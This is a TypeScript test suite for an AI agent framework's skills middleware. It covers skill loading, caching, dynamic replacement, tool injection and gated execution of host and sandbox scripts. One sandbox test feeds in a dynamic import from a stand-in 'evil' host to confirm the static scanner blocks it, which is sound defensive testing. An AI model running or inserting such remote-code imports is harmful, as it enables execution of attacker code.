import { z } from 'zod'
import { createDataOps } from '../../tools/dataOps'
import { fetchDocTools } from '../../tools/fetchDoc'
import { selectBuiltinTools, fetchTools, defineDataToolset } from '../../toolsets'
import { createUsageHintsMiddleware } from '../../harness/usageHints'
import { offloadLargeResult } from '../../utils/offload'
import { createVfs, createVfsTools } from '../../backends/vfs'
import { createTodosMiddleware } from '../../harness/todos'
import { createSkillsMiddleware, defineSkill, resolveDocKind, normalizeVfsPath, readSkillDoc, type SkillsController } from '../../harness/skills'
import { createPermissionsMiddleware } from '../../harness/permissions'
import { createMemoryMiddleware } from '../../harness/memory'
import { applyUpdate, runBeforeAgent, runAfterModel, runBeforeReturn } from '../../harness/middleware'
import { isAbort, isRetryable, withRetry } from '../../harness/retry'
import { runPool } from '../../utils/pool'
import { createSubagentMiddleware, createSubagentsMiddleware } from '../../harness/subagent'
import { createVerifyMiddleware, createWriteBackCheck, isAdversarialClean } from '../../harness/verify'
import { createApprovalMiddleware } from '../../harness/approval'
import { createHumanConfirmTool, createHumanConfirmMiddleware, HUMAN_CONFIRM_TOOL_NAME } from '../../harness/humanConfirm'
import { createCheckpointManager, createCheckpointMiddleware } from '../../harness/checkpoint'
import { extractText } from '../../mcp/client'
import { createInitialState as createState } from '../../harness/state'
import {
  encodeKey,
  estimateBytes,
  selectForEviction,
  isQuotaError,
  defaultMaxBytesFor,
  createMemoryBackend,
  createSessionStore,
} from '../../backends/storage'
import { resolveModelCaps, estimateTokens, offloadThresholdChars, offloadPassThroughChars } from '../../utils/modelCaps'
import { useContextManager } from '../../composables/useContextManager'
import { resolveContextOptions } from '../../sdk/contextPreset'
import { jpEval, searchJson } from '../../tools/dataSlotQuery'
import { createAgent, trimContextIfNeededImpl } from '../../harness/createAgent'
import { trimMemoryMessagesImpl } from '../../utils/rounds'
import type { Middleware } from '../../harness/middleware'
import { BaseChatModel } from '@langchain/core/language_models/chat_models'
import { AIMessage, AIMessageChunk, SystemMessage, HumanMessage, ToolMessage } from '@langchain/core/messages'

// tsx 运行时由 node 提供 process;tsc 静态检查无 @types/node,显式声明其类型
import type { TestCtx } from './_ctx'

// skills 中间件
export async function run(ctx: TestCtx): Promise<void> {
  const { assert, invoke, byName } = ctx
  console.log('\n[skills middleware]')
  {
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'demo', description: '演示', getContent: () => 'SKILL FULL CONTENT' }),
    ])
    const seg = mw.augmentPrompt?.(createState())
    assert(seg?.includes('demo') && /Skills/.test(seg || ''), 'skills 索引注入 system prompt')

    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    let r = await invoke(ls, { name: 'demo' })
    assert(/SKILL FULL CONTENT/.test(r), 'load_skill 返回全文')

    r = await invoke(ls, { name: 'demo' })
    assert(/已在本轮加载|无需重复/.test(r), 'load_skill 重复加载被防')

    r = await invoke(ls, { name: 'nope' })
    assert(/未找到/.test(r), 'load_skill 未知名报错')
  }

  console.log('\n[skills middleware 全文缓存 + 跨轮重新 load]')
  {
    // 用计数器验证 getContent 只调一次(缓存命中后不再调)
    let getContentCalls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'cached', description: '缓存测试', getContent: () => { getContentCalls++; return 'CACHED CONTENT ' + getContentCalls } }),
    ])
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    // 首次 load → getContent 调一次,返回内容含计数 1
    let r = await invoke(ls, { name: 'cached' })
    assert(getContentCalls === 1 && /CACHED CONTENT 1/.test(r), '首次 load_skill → getContent 调一次,返回首次内容')
    // 同轮再 load → 被拦截(loaded Set)
    r = await invoke(ls, { name: 'cached' })
    assert(/已在本轮加载|无需重复/.test(r) && getContentCalls === 1, '同轮再 load → 被 loaded 拦截,getContent 不再调')
    // 模拟跨轮:beforeAgent 清 loaded Set,允许重新 load,但用缓存(getContent 不再调)
    ;(mw as any).beforeAgent?.(createState())
    r = await invoke(ls, { name: 'cached' })
    assert(/CACHED CONTENT 1/.test(r) && getContentCalls === 1, '跨轮 beforeAgent 清 loaded → 允许重新 load,但用缓存(getContent 不再调,返回首次内容)')
  }

  console.log('\n[skills controller.set/invalidateCache → 动态替换同名 skill]')
  {
    let getContentCalls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'dyn', description: 'v1', getContent: () => { getContentCalls++; return 'V1 ' + getContentCalls } }),
    ])
    const ctrl = (mw as any).controller as SkillsController
    assert(ctrl && typeof ctrl.set === 'function' && typeof ctrl.get === 'function' && typeof ctrl.invalidateCache === 'function' && typeof ctrl.getContent === 'function', 'controller 暴露 set/get/invalidateCache/getContent')
    assert(ctrl.get().length === 1 && ctrl.get()[0].description === 'v1', 'controller.get 返回初始 skill')
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    let r = await invoke(ls, { name: 'dyn' })
    assert(/V1 1/.test(r) && getContentCalls === 1, '首次 load v1 → getContent 调一次')
    // 同名 skill 替换为 v2(getContent 返回不同内容)
    let v2Calls = 0
    ctrl.set([defineSkill({ name: 'dyn', description: 'v2', getContent: () => { v2Calls++; return 'V2 ' + v2Calls } })])
    assert(ctrl.get().length === 1 && ctrl.get()[0].description === 'v2', 'controller.set → get 返回 v2')
    // set 已清 contentCache + loaded,直接 load 取 v2 全文
    r = await invoke(ls, { name: 'dyn' })
    assert(/V2 1/.test(r) && v2Calls === 1, 'setSkills 同名替换 → 清缓存,下次 load 取 v2 全文(getContent 重新调一次)')
    // augmentPrompt 反映新 skill 索引
    const idx = (mw as any).augmentPrompt?.() as string
    assert(/v2/.test(idx) && !/v1/.test(idx), 'augmentPrompt 反映 setSkills 后的 v2 索引')
  }

  console.log('\n[skills controller.invalidateCache → 指定/全部清缓存]')
  {
    let c1Calls = 0, c2Calls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'a', description: 'A', getContent: () => { c1Calls++; return 'A' + c1Calls } }),
      defineSkill({ name: 'b', description: 'B', getContent: () => { c2Calls++; return 'B' + c2Calls } }),
    ])
    const ctrl = (mw as any).controller as SkillsController
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    await invoke(ls, { name: 'a' })
    await invoke(ls, { name: 'b' })
    assert(c1Calls === 1 && c2Calls === 1, '两个 skill 各 load 一次,getContent 各调一次')
    ;(mw as any).beforeAgent?.(createState())  // 清 loaded 允许重 load
    // 仅清 a 的缓存
    ctrl.invalidateCache('a')
    let r = await invoke(ls, { name: 'a' })
    assert(/A2/.test(r) && c1Calls === 2, 'invalidateCache(a) → a 重新 getContent,b 仍用缓存')
    r = await invoke(ls, { name: 'b' })
    ;(mw as any).beforeAgent?.(createState())
    assert(/B1/.test(r) && c2Calls === 1, 'b 仍命中缓存(getContent 不再调)')
    // 全清
    ctrl.invalidateCache()
    ;(mw as any).beforeAgent?.(createState())
    await invoke(ls, { name: 'a' })
    r = await invoke(ls, { name: 'b' })
    assert(/B2/.test(r) && c1Calls === 3 && c2Calls === 2, 'invalidateCache() 全清 → a/b 都重新 getContent(a=3 次,b=2 次)')
  }

  console.log('\n[skills controller.getContent → 读取 skill 全文(缓存优先)]')
  {
    let calls = 0
    const mw = createSkillsMiddleware([
      defineSkill({ name: 'doc', description: '文档', getContent: () => { calls++; return `DOC ${calls}` } }),
    ])
    const ctrl = (mw as any).controller as SkillsController
    // 首次 getContent → 调一次 getContent,缓存
    let c = await ctrl.getContent('doc')
    assert(c === 'DOC 1' && calls === 1, 'getContent 首次 → 调 getContent 一次,返回内容并缓存')
    // 再次 → 命中缓存,不调 getContent
    c = await ctrl.getContent('doc')
    assert(c === 'DOC 1' && calls === 1, 'getContent 再次 → 命中缓存,getContent 不再调,返回首次内容')
    // 不存在的 skill → null
    c = await ctrl.getContent('nope')
    assert(c === null, 'getContent 不存在的 skill → 返回 null')
    // setSkills 替换后缓存清空 → 重新 getContent 调一次
    let calls2 = 0
    ctrl.set([defineSkill({ name: 'doc', description: 'v2', getContent: () => { calls2++; return `DOC2 ${calls2}` } })])
    c = await ctrl.getContent('doc')
    assert(c === 'DOC2 1' && calls2 === 1, 'setSkills 同名替换 → 清缓存,getContent 重新调一次取新内容')
    // invalidateCache 后 → 重新 getContent 调一次
    ctrl.invalidateCache('doc')
    c = await ctrl.getContent('doc')
    assert(c === 'DOC2 2' && calls2 === 2, 'invalidateCache(doc) → getContent 重新调一次取最新')
  }

  console.log('\n[skills exec 钩子 · skill-external-scripts §3/§4]')
  {
    const { executeSkillExec } = await import('../../harness/skills')
    // 校验:code/url 都空
    let r = await executeSkillExec({} as any)
    assert(!r.ok && /未提供 code 或 url/.test(r.error), '✓ executeSkillExec:code/url 都空 → 失败')
    // 校验:code+url 都填
    r = await executeSkillExec({ code: 'return 1', url: 'http://x' } as any)
    assert(!r.ok && /不能同时提供/.test(r.error), '✓ executeSkillExec:code+url 都填 → 失败(二选一)')
    // url+host 禁止(远程不可信不能全权跑)
    r = await executeSkillExec({ url: 'http://x', context: 'host' } as any)
    assert(!r.ok && /host/.test(r.error), '✓ executeSkillExec:url+host → 拒绝(远程不可信不能全权跑)')
    // host + 未开 skillHostScript → 拒绝
    r = await executeSkillExec({ code: 'return 1', context: 'host' }, false)
    assert(!r.ok && /skillHostScript/.test(r.error), '✓ executeSkillExec:host 未开 skillHostScript → 拒绝')
    // host + 开 skillHostScript + 内联 code → 执行(AsyncFunction,node 可跑)
    r = await executeSkillExec({ code: 'return 41 + 1', context: 'host' }, true)
    assert(r.ok && r.text === '42', '✓ executeSkillExec:host 开 + code → runHostScript 执行返回结果')
    // host 脚本含 fetch 字样不被静态扫描拒(host 跳过 SANDBOX_FORBIDDEN_PATTERNS,集成方可信代码)
    r = await executeSkillExec({ code: 'return "fetch ok"', context: 'host' }, true)
    assert(r.ok && /fetch ok/.test(r.text), '✓ executeSkillExec:host 脚本含 fetch 字样不被静态扫描拒')
    // sandbox 静态扫描拒绝(命中即 return,不创建 Worker,node 可测)
    r = await executeSkillExec({ code: 'return import("https://evil/x.js")', context: 'sandbox' }, true)
    assert(!r.ok && /禁用模式/.test(r.error), '✓ executeSkillExec:sandbox 静态扫描拒绝动态 import()')
  }

  console.log('\n[skills buildSkillContent · exec 注入 + 失败不缓存]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    // exec 成功(host path)→ 注入 + 缓存
    let loadCalls = 0
    const mw1 = createSkillsMiddleware(
      [defineSkill({ name: 'dyn', description: '动态', getContent: () => { loadCalls++; return 'BASE ' + loadCalls }, exec: { code: 'return "LIVE:"+(40+2)', context: 'host' } })],
      { hostScriptEnabled: true },
    )
    const ls1 = mw1.tools!.find((x) => x.name === 'load_skill')!
    let rr = await ls1.invoke({ name: 'dyn' })
    assert(/BASE 1/.test(rr) && /LIVE:42/.test(rr), '✓ buildSkillContent:exec 成功 → 实时数据注入全文(BASE + LIVE)')
    // exec 成功缓存:跨轮 beforeAgent 清 loaded → 用缓存(exec + getContent 都不重跑)
    ;(mw1 as any).beforeAgent()
    loadCalls = 0
    rr = await ls1.invoke({ name: 'dyn' })
    assert(/BASE 1/.test(rr) && loadCalls === 0, '✓ exec 成功缓存:跨轮用缓存(exec + getContent 都不重跑)')

    // exec 失败(host 未开)→ 标注 + 不缓存(下次 load 重试)
    const mw2 = createSkillsMiddleware(
      [defineSkill({ name: 'fail', description: '失败', getContent: () => 'FAILBASE', exec: { code: 'return 1', context: 'host' } })],
      { hostScriptEnabled: false },
    )
    const ls2 = mw2.tools!.find((x) => x.name === 'load_skill')!
    rr = await ls2.invoke({ name: 'fail' })
    assert(/FAILBASE/.test(rr) && /脚本执行失败/.test(rr) && /skillHostScript/.test(rr), '✓ exec 失败 → 文本可用 + 标注失败原因(不阻塞)')
    // 失败不缓存:跨轮重新 load → exec 重试
    ;(mw2 as any).beforeAgent()
    rr = await ls2.invoke({ name: 'fail' })
    assert(/脚本执行失败/.test(rr), '✓ exec 失败不缓存:跨轮重新 load → 重新执行 exec(动态 skill 可重试)')

    // inject prepend → 实时数据在文本前
    const mw3 = createSkillsMiddleware(
      [defineSkill({ name: 'pre', description: '前插', getContent: () => 'TAIL', exec: { code: 'return "HEAD"', context: 'host', inject: 'prepend' } })],
      { hostScriptEnabled: true },
    )
    const ls3 = mw3.tools!.find((x) => x.name === 'load_skill')!
    rr = await ls3.invoke({ name: 'pre' })
    assert(rr.indexOf('HEAD') < rr.indexOf('TAIL'), '✓ exec inject:prepend → 实时数据在文本前')
  }

  console.log('\n[skills tools 注入 · skill-external-scripts §5]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    const { tool } = await import('@langchain/core/tools')
    const { z } = await import('zod')
    let injected: string[] = []
    const fakeTool = tool(async () => 'ok', { name: 'mytool', description: 'd', schema: z.object({}) })
    const mw = createSkillsMiddleware(
      [defineSkill({ name: 't', description: '带工具', getContent: () => 'T', tools: [() => fakeTool] })],
      { onToolsReady: (_n, ts) => { injected = ts.map((x: any) => x.name) } },
    )
    await (mw.tools!.find((x) => x.name === 'load_skill')!).invoke({ name: 't' })
    assert(injected.includes('mytool'), '✓ skill tools:load_skill 后 onToolsReady 触发,工具注入回调收到工具')
    // 无 tools 的 skill 不触发
    injected = []
    const mw2 = createSkillsMiddleware([defineSkill({ name: 'plain', description: '无工具', getContent: () => 'P' })], { onToolsReady: (_n, ts) => { injected = ts.map((x: any) => x.name) } })
    await (mw2.tools!.find((x) => x.name === 'load_skill')!).invoke({ name: 'plain' })
    assert(injected.length === 0, '✓ skill tools:无 tools 的 skill 不触发 onToolsReady')
  }

  console.log('\n[skill exec 空结果不缓存 · 审查修复(低2)]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    ;(globalThis as any).__cnt = 0
    const mw = createSkillsMiddleware(
      [defineSkill({ name: 'empty', description: '空结果', getContent: () => 'B', exec: { code: 'globalThis.__cnt++; return ""', context: 'host' } })],
      { hostScriptEnabled: true },
    )
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    await ls.invoke({ name: 'empty' })  // exec 跑(__cnt=1),返回空 → cacheable false 不缓存
    ;(mw as any).beforeAgent()  // 跨轮清 loaded
    await ls.invoke({ name: 'empty' })  // 未缓存 → 重跑 exec(__cnt=2)
    assert((globalThis as any).__cnt === 2, '✓ exec 空结果不缓存:跨轮重新 load → exec 重跑(__cnt=2,非缓存命中)')
    delete (globalThis as any).__cnt
  }

  console.log('\n[load_skill TOCTOU · await 期间 skill 替换不注入孤立工具 · 审查修复(中1)]')
  {
    const { createSkillsMiddleware, defineSkill } = await import('../../harness/skills')
    const { tool } = await import('@langchain/core/tools')
    const { z } = await import('zod')
    let resolveGC!: () => void
    const gcPromise = new Promise<string>((r) => { resolveGC = () => r('BASE') })
    let onToolsCalled = false
    const fakeTool = tool(async () => 'ok', { name: 'stale__t', description: 'd', schema: z.object({}) })
    const mw = createSkillsMiddleware(
      [defineSkill({ name: 'stale', description: '工具', getContent: () => gcPromise, tools: [() => fakeTool] })],
      { onToolsReady: () => { onToolsCalled = true } },
    )
    const ls = mw.tools!.find((x) => x.name === 'load_skill')!
    const loadP = ls.invoke({ name: 'stale' })  // 触发,getContent pending(await 中)
    // await 期间 setSkills 替换(stale 不再注册)→ 模拟 load_skill await 时 skill 被替换
    ;(mw as any).controller.set([defineSkill({ name: 'other', description: 'o', getContent: () => 'O' })])
    resolveGC()  // getContent resolve → load_skill 继续,但 skillMap.get('stale') !== s → 不调 onToolsReady
    await loadP
    assert(!onToolsCalled, '✓ TOCTOU:load_skill await 期间 skill 被 setSkills 替换 → onToolsReady 不注入孤立工具(skillMap.get(name)===s 守卫)')
  }

  console.log('\n[runHostScript 超时 + 正常执行 · 审查修复(中2)]')
  {
    const { runHostScript } = await import('../../tools/hostScript')
    const r = await runHostScript('return new Promise(() => {})', 80)  // 永不 resolve → 超时
    assert(!r.ok && /超时/.test(r.error || ''), '✓ runHostScript 超时 → ok:false + 超时标注(主线程无法取消,弃结果)')
    const r2 = await runHostScript('return 1 + 2', 1000)
    assert(r2.ok && r2.result === 3, '✓ runHostScript 正常执行 → ok:true + result')
  }
}
